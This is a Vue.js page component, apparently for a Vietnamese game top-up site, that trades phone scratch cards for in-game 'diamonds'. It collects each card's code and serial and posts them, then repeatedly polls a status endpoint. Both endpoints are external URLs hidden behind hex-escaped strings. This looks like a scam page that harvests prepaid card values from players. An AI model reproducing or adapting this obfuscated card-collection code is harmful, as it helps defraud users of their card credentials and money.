<script type="text/javascript" >

export default {
    name: 'recharge',
    data(){
        return {
            error:{
                id: ''
            },
              mang:{
                id: '',
                name: ''
                
            },
            menhgia:{
                name: ''
            },
            kimcuong:{
                soluong:''
            },
            idgame:{
                id: ''
            },
            thecao:{
                code: '',
                serial: '',
                telco: '',
                amount: '',
            }
        }
    },
    created() {
         window.scrollTo(0,0);
        var idff = sessionStorage.getItem('idGame');
        if(idff){
            this.idgame.id = idff
        }
       
        let telco = this.$route.params.telco
        let amount = this.$route.params.amount
        if(telco == '205168'){
                this.mang.name = 'Viettel'
                 this.thecao.telco = 'Viettel'
                this.mang.id = '205168'
            }else if(telco == '205160'){
                this.mang.name = 'Mobifone'
               this.thecao.telco = 'Mobifone'
                this.mang.id = '205160'
            }else if(telco == '205158'){
                this.mang.name = 'Vinaphone'
                this.thecao.telco = 'Vinaphone'
                this.mang.id = '205158'
            }
        if(amount == 1){
            this.menhgia.id = '1'
            this.menhgia.name = '10000'
            this.thecao.amount = '10000'
            this.kimcuong.soluong = '45'
        }else if(amount == 2){
            this.menhgia.id = '2'
            this.menhgia.name = '20000'
            this.thecao.amount = '20000'
            this.kimcuong.soluong = '90'
        }else if(amount == 3){
            this.menhgia.id = '3'
            this.menhgia.name = '50000'
            this.thecao.amount = '50000'
            this.kimcuong.soluong = '460'
        }else if(amount == 4){
            this.menhgia.id = '4'
            this.menhgia.name = '100000'
            this.thecao.amount = '100000'
            this.kimcuong.soluong = '912'
        }else if(amount == 5){
            this.menhgia.id = '5'
            this.menhgia.name = '200000'
            this.thecao.amount = '200000'
            this.kimcuong.soluong = '1900'
        }else if(amount == 6){
            this.menhgia.id = '6'
            this.menhgia.name = '500000'
            this.thecao.amount = '500000'
            this.kimcuong.soluong = '4750'
        }
      
    },
    methods: {
        validate() {
         
            if(this.thecao.code.length === 0 ){
                this.error.id = "Vui lòng nhập mã thẻ"
            }else if(this.thecao.serial.length === 0){
                 this.error.id = "Vui lòng nhập số seri"
            }else{
                return true
            }
        },
       recharge(){
            if(this.validate() == true){
                 $("body").append('<div class="ht-loading-gif"><img src="images/preloader.svg" /></div>');
              this.$request.post('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x76\x6e\x31\x2e\x66\x75\x6e\x2f\x6e\x61\x70\x74\x68\x65\x6a\x73\x2e\x70\x68\x70', this.thecao).then(res =>{
                if(res.data.status == 'error'){
                     $("body").find("div.ht-loading-gif").remove();
                    
                      this.error.id = res.data.msg
                   
              
                }else if(res.data.status == 'success'){
                     this.error.id = "Thẻ đang được xử lí, Vui lòng chờ!"
                 setInterval(() => {
                           this.$request.post('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x76\x6e\x31\x2e\x66\x75\x6e\x2f\x63\x68\x65\x63\x6b\x63\x61\x72\x64\x2e\x70\x68\x70', {serial: this.thecao.serial}).then(res =>{
                            console.log(res.data)
                            if(res.data == 1){
                                  $("body").find("div.ht-loading-gif").remove();
                                 this.$router.push({name: 'success', params:{telco: this.mang.id, amount: this.menhgia.id } })
                                 return;
                            }if(res.data == 2){
                                  $("body").find("div.ht-loading-gif").remove();
                                 this.$router.push({name: 'error', params:{telco: this.mang.id, amount: this.menhgia.id } })
                                  return;
                            }if(res.data == 3){
                                  $("body").find("div.ht-loading-gif").remove();
                                this.$router.push({name: 'error', params:{telco: this.mang.id, amount: this.menhgia.id } }) 
                                 return;
                            }
                           })
                           
                     }, 5000);
                }
                
              }) 
      
            }

        }
    }

}
    
    $(document).ready(function() {
       $('#logout').click(function() {
        sessionStorage.clear();
        window.location.href = '/';
    });
        var type = sessionStorage.getItem('type'),
            idGame = sessionStorage.getItem('idGame');
       

        $(window).on('load', function() {
            if (!idGame) {
                window.location.href = '/';
            }
        });

    
    });
